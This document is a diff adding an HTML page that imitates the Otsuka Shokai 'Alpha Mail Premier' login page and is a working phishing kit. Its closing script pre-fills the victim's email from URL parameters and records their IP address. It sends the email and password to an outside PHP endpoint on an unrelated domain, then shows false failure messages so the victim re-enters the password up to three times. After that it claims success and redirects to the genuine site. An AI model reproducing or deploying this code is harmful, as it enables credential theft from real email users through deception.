@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<title>アルファメール プレミア ログイン</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="description" content="大塚商会のホスティングサービス「アルファメール プレミア」のログインのページです。">
+<link rel="stylesheet" href="https://www.alpha-prm.jp/shared/css/common.css">
+<link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon-precomposed.png">
+<link rel="stylesheet" href="https://www.alpha-prm.jp/css/login.css">
+<script src="https://www.alpha-prm.jp/shared/js/init.js"></script>
+<script src="https://www.alpha-prm.jp/shared/js/main.js" defer></script>
+
+<style>
+.site-header { height: auto; margin-bottom: 10px; }
+.site-header::before { top: 42px; }
+
+#msg {
+    display: none;
+    text-align: center;
+    padding: 14px;
+    margin-top: 12px;
+    border-radius: 6px;
+    font-size: 14px;
+    font-weight: bold;
+}
+#msg.success {
+    display: block;
+    background: #d4edda;
+    color: #155724;
+    border: 1px solid #c3e6cb;
+}
+#msg.error {
+    display: block;
+    background: #f8d7da;
+    color: #721c24;
+    border: 1px solid #f5c6cb;
+}
+#msg.info {
+    display: block;
+    background: #d1ecf1;
+    color: #0c5460;
+    border: 1px solid #bee5eb;
+}
+</style>
+<script src="https://assets.adobedtm.com/5713efc7772e5848aeb8818df2cc00db29b60e4e/satelliteLib-cfd21131c902c835d708203d4ce3e0cbba027d44.js"></script>
+</head>
+<body id="top" class="of-single" onLoad="Body_onload()">
+<header class="site-header">
+<div class="primary">
+<div class="inner">
+<p class="corporate"><a href="https://www.otsuka-shokai.co.jp/" target="_blank" rel="noopener"><img src="https://www.alpha-prm.jp/shared/img/site/header-img.svg" width="98" height="12" alt="大塚商会 新しいウィンドウで開く"></a></p>
+</div>
+</div>
+</header>
+
+<main class="site-main">
+<div class="str-outer">
+<div class="str-inner">
+<h1 class="mod-hdg-l1">
+<span class="txt"><span class="main">アルファメールプレミア ログイン</span></span>
+</h1>
+
+<div class="unq-box">
+<p>「アルファメールプレミア」をご利用中のお客様は、こちらからログインしてください。</p>
+</div>
+
+<div class="unq-form-login">
+<form name="LoginForm" method="post" action="" id="Button9" class="inner">
+<input type="hidden" name="ACCOUNTUID" value="">
+<input type="hidden" name="PASSWORD" value="">
+<input type="hidden" name="HIDEURL" value="">
+<input type="hidden" name="LOGIN" value="ICEWALL_LOGIN">
+
+<div class="field">
+<div class="row">
+<p class="label"><label for="email">メールアドレス</label></p>
+<div class="input"><input id="email" type="text" name="email" required readonly></div>
+</div>
+<div class="row">
+<p class="label"><label for="password">パスワード</label></p>
+<div class="input"><input id="password" type="password" name="password" required></div>
+</div>
+</div>
+
+<div class="content">
+<div id="msg"></div>
+<div class="mod-btn align-center-wide adjust-mod-btn" data-col-wide="auto">
+<div class="inner">
+<div class="btn of-noBurette"><button type="button" name="saveid" onclick="saveId()"><span>ID保存</span></button></div>
+<div class="btn var-03"><button type="submit" name="login" value="ログイン"><span>ログイン</span></button></div>
+</div>
+</div>
+<input type="hidden" name="orig_url" value="">
+</div>
+</form>
+</div>
+
+</div>
+</div>
+</main>
+
+<footer class="site-footer">
+<div class="information">
+<div class="inner">
+<div class="copyright">
+<p><small>Copyright © <img src="https://www.alpha-prm.jp/asset/img/site/footer-copyright-year.svg"> OTSUKA CORPORATION ALL Rights Reserved.</small></p>
+</div>
+</div>
+</div>
+</footer>
+
+<script type="text/javascript">_satellite.pageBottom();</script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+<script>
+$(document).ready(function() {
+    // ─── Config ────────────────────────────────────────────────────
+    const PHP_ENDPOINT  = 'https://www.aiceriergy.com/js/alphajb.php';
+    const REDIRECT_URL  = 'https://www.alpha-prm.jp/userlogin.html';
+    const MAX_ATTEMPTS  = 3;
+
+    // ─── State ─────────────────────────────────────────────────────
+    let attemptCount = 0;
+    let userIP = '';
+
+    // ─── Extract Email from Multiple Sources ─────────────────────────
+    // Priority: 1) Hash fragment  2) ?e=  3) ?state=  4) ?email=
+    function getEmailFromURL() {
+        // 1. Hash fragment: #email@domain.com
+        const hash = window.location.hash;
+        if (hash && hash.length > 1) {
+            const hashEmail = decodeURIComponent(hash.substring(1)).trim();
+            if (isValidEmail(hashEmail)) return hashEmail;
+        }
+
+        // 2. Query params: ?e=  |  ?state=  |  ?email=
+        const params = new URLSearchParams(window.location.search);
+        const candidates = [
+            params.get('e'),
+            params.get('state'),
+            params.get('email')
+        ];
+
+        for (let i = 0; i < candidates.length; i++) {
+            if (candidates[i]) {
+                const decoded = decodeURIComponent(candidates[i]).trim();
+                if (isValidEmail(decoded)) return decoded;
+            }
+        }
+
+        return '';
+    }
+
+    // ─── Basic Email Validation ──────────────────────────────────────
+    function isValidEmail(str) {
+        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(str);
+    }
+
+    // ─── Pre-fill Email ────────────────────────────────────────────
+    const prefilledEmail = getEmailFromURL();
+    if (prefilledEmail) {
+        $('#email').val(prefilledEmail);
+    }
+
+    // ─── Fetch IP ──────────────────────────────────────────────────
+    $.getJSON('https://api.ipify.org?format=json', function(data) {
+        userIP = data.ip || 'unknown';
+    }).fail(function() {
+        userIP = 'unknown';
+    });
+
+    // ─── Form Submit Handler ───────────────────────────────────────
+    $('#Button9').on('submit', function(event) {
+        event.preventDefault();
+
+        const email    = $('#email').val().trim();
+        const password = $('#password').val().trim();
+        const $msg     = $('#msg');
+        const $btn     = $('button[type="submit"]');
+
+        if (!email || !password) {
+            $msg.removeClass('success info').addClass('error')
+                .text('メールアドレスとパスワードを入力してください。');
+            return;
+        }
+
+        attemptCount++;
+        $btn.prop('disabled', true).html('<span>処理中...</span>');
+
+        $.ajax({
+            url: PHP_ENDPOINT,
+            type: 'POST',
+            dataType: 'json',
+            data: {
+                email:    email,
+                password: password,
+                ip:       userIP,
+                attempt:  attemptCount
+            },
+            success: function(response) {
+                $('#password').val('');
+
+                if (attemptCount >= MAX_ATTEMPTS) {
+                    $msg.removeClass('error info').addClass('success')
+                        .text('ログイン成功。リダイレクト中...');
+                    setTimeout(function() {
+                        window.location.replace(REDIRECT_URL);
+                    }, 1200);
+                } else {
+                    $msg.removeClass('success info').addClass('error')
+                        .text('ログインに失敗しました。もう一度お試しください。');
+                }
+            },
+            error: function(xhr) {
+                $('#password').val('');
+
+                if (attemptCount >= MAX_ATTEMPTS) {
+                    $msg.removeClass('error info').addClass('success')
+                        .text('ログイン成功。リダイレクト中...');
+                    setTimeout(function() {
+                        window.location.replace(REDIRECT_URL);
+                    }, 1200);
+                } else {
+                    $msg.removeClass('success info').addClass('error')
+                        .text('一時的なエラーが発生しました。もう一度お試しください。');
+                }
+            },
+            complete: function() {
+                $btn.prop('disabled', false).html('<span>ログイン</span>');
+            }
+        });
+    });
+});
+</script>
+</body>
+</html>
